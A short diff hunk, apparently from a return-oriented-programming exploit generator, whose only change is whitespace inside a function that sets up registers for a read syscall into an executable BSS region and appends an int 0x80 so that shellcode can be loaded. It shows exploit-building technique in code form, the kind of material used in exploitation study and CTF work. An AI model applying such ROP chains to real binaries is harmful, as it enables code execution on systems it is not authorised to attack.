@@ -64,14 +64,13 @@ def rop_exploit(binary_name, shellcode_name):
 
     print("Made BSS executable")
 
-
     # # Read into BSS
     commands = {"eax" : push_to_reg(3,"eax",gadgets,rop),
                 "ebx" : push_to_reg(0,"ebx",gadgets,rop),
                 "ecx" : push_to_reg(bss,"ecx",gadgets,rop), 
                 "edx" : push_to_reg(shellcode_len,"edx",gadgets,rop)}
 
-    
+
     exploit += schedule(commands)
     exploit += INT80
 
